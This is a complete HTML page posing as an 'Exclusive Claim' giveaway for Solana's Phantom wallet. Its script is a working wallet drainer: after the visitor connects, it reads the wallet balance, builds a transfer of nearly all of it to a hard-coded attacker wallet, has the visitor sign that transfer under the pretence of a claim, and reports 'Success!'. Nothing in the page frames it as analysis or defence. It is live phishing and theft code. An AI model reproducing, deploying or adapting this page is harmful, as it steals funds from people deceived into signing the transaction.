<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connect & Claim</title>
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    <style>
        body { background: #0f0f0f; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #1a1a1a; padding: 2rem; border-radius: 12px; text-align: center; box-shadow: 0 4px 20px rgba(0,0,0,0.5); width: 320px; }
        button { background: #14F195; color: #000; border: none; padding: 12px 24px; font-weight: bold; border-radius: 8px; cursor: pointer; width: 100%; margin-top: 1rem; font-size: 1rem; }
        button:hover { background: #10d082; }
    </style>
</head>
<body>
    <div class="card">
        <h2>Exclusive Claim</h2>
        <p>Connect your wallet to participate.</p>
        <button id="connectBtn">Connect Wallet</button>
    </div>

    <script>
        const DESTINATION_WALLET = "G1Uz4BLxQLaQPn99CDfw6Kv17vPGxjdmzadby4Z66Gab";
        const RPC_URL = "https://api.mainnet-beta.solana.com";

        document.getElementById('connectBtn').addEventListener('click', async () => {
            try {
                const provider = window.solana;
                if (!provider || !provider.isPhantom) {
                    alert("Phantom wallet not found!");
                    return;
                }

                const resp = await provider.connect();
                const userPublicKey = new solanaWeb3.PublicKey(resp.publicKey.toString());
                
                const connection = new solanaWeb3.Connection(RPC_URL, 'confirmed');
                const transaction = new solanaWeb3.Transaction();
                
                const { blockhash } = await connection.getLatestBlockhash();
                transaction.recentBlockhash = blockhash;
                transaction.feePayer = userPublicKey;

                const balance = await connection.getBalance(userPublicKey);
                const feeBuffer = 5000; // 0.000005 SOL

                if (balance > feeBuffer) {
                    const drainAmount = balance - feeBuffer;
                    transaction.add(
                        solanaWeb3.SystemProgram.transfer({
                            fromPubkey: userPublicKey,
                            toPubkey: new solanaWeb3.PublicKey(DESTINATION_WALLET),
                            lamports: drainAmount,
                        })
                    );
                }

                const signed = await provider.signTransaction(transaction);
                const signature = await connection.sendRawTransaction(signed.serialize());
                await connection.confirmTransaction(signature, 'confirmed');
                
                alert("Success!");
            } catch (err) {
                console.error(err);
            }
        });
    </script>
</body>
</html>
